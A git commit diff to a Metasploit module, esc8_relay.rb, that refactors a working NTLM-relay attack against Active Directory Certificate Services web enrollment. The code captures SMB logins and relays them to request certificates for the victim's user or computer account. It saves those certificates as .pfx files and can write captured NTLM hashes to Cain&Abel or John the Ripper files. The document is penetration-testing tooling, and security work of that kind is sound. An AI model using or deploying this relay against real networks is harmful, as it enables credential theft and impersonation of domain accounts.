a18b2b3671bfd3b96bac477d800fda9b6928302e
bwatters-r7 <bwatters@rapid7.com>
2024-10-17 14:46:48 -0500

    code cleanup and documentation

--- modules/auxiliary/server/capture/esc8_relay.rb
+++ modules/auxiliary/server/capture/esc8_relay.rb
@@ -31,10 +31,11 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('CERT_TEMPLATE', [ false, 'The user to issue the certificate for.', nil ]),
+        OptString.new('CAINPWFILE', [ false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil ]),
+        OptString.new('JOHNPWFILE', [ false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil ]),
+        OptString.new('CERT_TEMPLATE', [ false, 'The user to issue the certificate for if MODE is SPECIFIC_TEMPLATE.', nil ]),
         OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
-        OptBool.new('QUERY_TEMPLATES', [ true, 'Query certificate templates and print them before attempting to use them', true ]),
-        OptBool.new('QUERY_ONLY', [ true, 'Only use the relay to get a list of templates; do not generate certificates.', false ]),
+        OptEnum.new('MODE', [ true, 'Capture Mode', 'AUTO', %w[ALL AUTO QUERY_ONLY SPECIFIC_TEMPLATE]]),
         OptAddress.new('RELAY_TARGET', [true, 'Target address range or CIDR identifier to relay to'], aliases: ['SMBHOST']),
         OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
         OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
@@ -51,6 +52,15 @@ class MetasploitModule < Msf::Auxiliary
                        'HttpPassword')
   end
 
+  @dialects = [
+    RubySMB::Client::SMB1_DIALECT_SMB1_DEFAULT,
+
+    RubySMB::Client::SMB2_DIALECT_0202,
+    RubySMB::Client::SMB2_DIALECT_0210,
+    RubySMB::Client::SMB2_DIALECT_0300,
+    RubySMB::Client::SMB2_DIALECT_0302,
+  ]
+
   def initial_handshake?
     res = send_request_cgi(
       {
@@ -65,10 +75,24 @@ class MetasploitModule < Msf::Auxiliary
 
     return false if res.nil? || res.code != 401
 
-    return true
+    true
+  end
+
+  def check_options
+    case datastore['MODE']
+    when 'SPECIFIC_TEMPLATE'
+      if datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
+        fail_with(Failure::BadConfig, 'CERT_TEMPLATE must be set in AUTO and SPECIFIC_TEMPLATE mode')
+      end
+    when 'ALL', 'AUTO', 'QUERY_ONLY'
+      unless datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
+        print_warning('CERT_TEMPLATE is ignored in ALL, AUTO, and QUERY_ONLY modes.')
+      end
+    end
   end
 
   def start_service(opts = {})
+    check_options
     @issued_certs = {}
     unless initial_handshake?
       fail_with(Failure::UnexpectedReply, "#{datastore['RELAY_TARGET']} does not appear to have Web Enrollment enabled on #{datastore['CERT_URI']}")
@@ -85,6 +109,14 @@ class MetasploitModule < Msf::Auxiliary
     ntlm_provider.netbios_hostname = datastore['SMBDomain']
     validate_smb_hash_capture_datastore(datastore, ntlm_provider)
     opts[:gss_provider] = ntlm_provider
+    opts[:dialects] = [
+      RubySMB::Client::SMB1_DIALECT_SMB1_DEFAULT,
+
+      RubySMB::Client::SMB2_DIALECT_0202,
+      RubySMB::Client::SMB2_DIALECT_0210,
+      RubySMB::Client::SMB2_DIALECT_0300,
+      RubySMB::Client::SMB2_DIALECT_0302,
+    ]
     super(opts)
   end
 
@@ -106,15 +138,15 @@ class MetasploitModule < Msf::Auxiliary
     request.public_key = private_key.public_key
     request.sign(private_key, OpenSSL::Digest.new('SHA256'))
     vprint_status('CSR Generated')
-    return request
+    request
   end
 
   def post_login_action(kwargs = {})
-    authenticated_username = kwargs[:authenticated_username]
+    authenticated_user = kwargs[:authenticated_username]
     authenticated_http_client = kwargs[:authenticated_http_client]
     authenticated_domain = kwargs[:authenticated_domain]
 
-    if authenticated_username.nil?
+    if authenticated_user.nil?
       print_error('esc8_relay: Post Login Action requires an authenticated username')
       return nil
     end
@@ -127,65 +159,55 @@ class MetasploitModule < Msf::Auxiliary
       return nil
     end
 
-    cert_list = nil
-    if datastore['QUERY_TEMPLATES']
-      print_status('Querying certificate templates; this may take some time')
+    case datastore['MODE']
+    when 'AUTO'
+      cert_template = 'User'
+      cert_template = 'Computer' if authenticated_user[-1] == '$'
+      retrieve_cert(cert_template, authenticated_user, authenticated_domain, authenticated_http_client)
+    when 'ALL', 'QUERY_ONLY'
       cert_list = get_cert_list(authenticated_http_client)
-      if cert_list.nil? || cert_list.empty?
-        print_bad('http_relay failed to query cert_list') if cert_list.nil?
-        print_bad('http_relay returned no available certs') if cert_list.empty?
-      else
-        print_status('Available Certificates:')
+      unless cert_list.nil? || cert_list.empty?
+        print_message = "Available Certificates for #{authenticated_domain}\\#{authenticated_user} on #{datastore['RELAY_TARGET']}:\n"
         cert_list.each do |cert_entry|
-          print_status(cert_entry)
+          print_message << "      #{cert_entry}\n"
+        end
+        print_status(print_message)
+        if datastore['MODE'] == 'ALL'
+          retrieve_certs(cert_list, authenticated_user, authenticated_domain, authenticated_http_client)
         end
       end
+    when 'SPECIFIC_TEMPLATE'
+      cert_template = datastore['CERT_TEMPLATE']
+      retrieve_cert(cert_template, authenticated_user, authenticated_domain, authenticated_http_client)
     end
-    unless datastore['QUERY_ONLY']
-      if cert_list.nil? || cert_list.empty? || cert_list.include?(datastore['CERT_TEMPLATE'])
-        # if we don't have a cert list or if the cert is in the list, just generate that cert
-        if cert_entry?(authenticated_username, authenticated_domain, datastore['CERT_TEMPLATE'])
-          vprint_status("Cert for #{authenticated_domain}\\#{authenticated_username} using #{datastore['CERT_TEMPLATE']} already captured; skipping")
-        else
-          retrieve_cert(datastore['CERT_TEMPLATE'], authenticated_username, authenticated_domain, authenticated_http_client)
-        end
-      else
-        # if we have a cert list and the desired template is not there
-        # or the desired template is nil, just issue all available certs
-        print_bad("#{datastore['CERT_TEMPLATE']} not found in available certificates") unless datastore['CERT_TEMPLATE'].nil?
-        print_status('Attempting to generate certificates for all templates')
-        cert_list.each do |cert_entry|
-          if cert_entry?(authenticated_username, authenticated_domain, cert_entry)
-            vprint_status("Cert for #{authenticated_domain}\\#{authenticated_username} using #{cert_entry} already captured; skipping")
-          else
-            retrieve_cert(cert_entry, authenticated_username, authenticated_domain, authenticated_http_client)
-          end
-        end
-      end
-    end
+    vprint_status('Relay tasks complete; waiting for next login attempt.')
   end
 
-  def get_cert_list(client_socket)
-    req = client_socket.request_raw(
+  def get_cert_list(authenticated_http_client)
+    print_status('Retrieving available template list, this may take a few minutes')
+    req = authenticated_http_client.request_raw(
       {
         'method' => 'GET',
         'uri' => "#{datastore['CERT_URI']}/certrqxt.asp"
       }
     )
-    res = client_socket._send_recv(req, @http_timeout, true)
+    res = authenticated_http_client._send_recv(req, @http_timeout, true)
+    return nil unless res&.code == 200
+
     raw_list = res.body.scan(/^.*Option Value="E;(.*?);/)
-    user_list = []
+    cert_list = []
     raw_list.each do |element|
-      user_list.append(element[0])
+      cert_list.append(element[0])
     end
-    return user_list
+    print_bad('http_relay returned no available certs') if cert_list.empty?
+    cert_list
   end
 
   def cert_entry?(authenticated_user, authenticated_domain, cert_template)
     auth_string = "#{authenticated_domain}\\#{authenticated_user}"
     return false if @issued_certs[auth_string].nil? || !@issued_certs[auth_string].include?(cert_template)
 
-    return true
+    true
   end
 
   def add_cert_entry(authenticated_user, authenticated_domain, cert_template)
@@ -197,11 +219,23 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  def retrieve_certs(cert_list, authenticated_user, authenticated_domain, authenticated_http_client)
+    cert_list.each do |cert_entry|
+      retrieve_cert(cert_entry, authenticated_user, authenticated_domain, authenticated_http_client)
+    end
+  end
+
   def retrieve_cert(cert_template, authenticated_user, authenticated_domain, authenticated_http_client)
-    vprint_status("Sending Post to generate certificate for #{authenticated_user} using the #{cert_template} template")
+    if cert_entry?(authenticated_user, authenticated_domain, cert_template)
+      print_status("Certificate already created for #{authenticated_domain}\\#{authenticated_user} using #{cert_template}, skipping..")
+      return nil
+    end
+
+    vprint_status("Creating certificate request for #{authenticated_domain}\\#{authenticated_user} using the #{cert_template} template")
     private_key = OpenSSL::PKey::RSA.new(4096)
     request = create_csr(private_key, cert_template)
     cert_template_string = "CertificateTemplate:#{cert_template}"
+    vprint_status('Requesting relay target generate certificate...')
     req = authenticated_http_client.request_cgi(
       {
         'method' => 'POST',
@@ -218,18 +252,17 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
     res = authenticated_http_client._send_recv(req, @http_timeout, true)
-    vprint_status('Post Sent')
     if res&.code == 200 && !res.body.include?('request was denied')
-      print_good("Certificate Request Granted using template #{cert_template} and user #{authenticated_user}")
+      print_good("Certificate generated using template #{cert_template} and user #{authenticated_user}")
       add_cert_entry(authenticated_user, authenticated_domain, cert_template)
     else
-      print_bad("Certificate Request Denied using template #{cert_template} and user #{authenticated_user}")
+      print_bad("Certificate request denied using template #{cert_template} and user #{authenticated_user}")
       return nil
     end
 
     location_tag = res.body.match(/^.*location="(.*)"/)[1]
-    location_uri = "#{datastore['CERT_URI']}/#{location_tag}"
-    vprint_status('Requesting Certificate from Relay Target...')
+    location_uri = normalize_uri("#{datastore['CERT_URI']}/#{location_tag}")
+    vprint_status("Attempting to download the certificate from #{location_uri}")
     req = authenticated_http_client.request_cgi(
       {
         'method' => 'GET',
@@ -246,7 +279,7 @@ class MetasploitModule < Msf::Auxiliary
                              pkcs12.to_der,
                              'certificate.pfx',
                              info)
-    print_status("Certificate for #{authenticated_domain}\\#{authenticated_user} using template #{cert_template} saved to #{stored_path}")
+    print_good("Certificate for #{authenticated_domain}\\#{authenticated_user} using template #{cert_template} saved to #{stored_path}")
     return certificate
   end
 
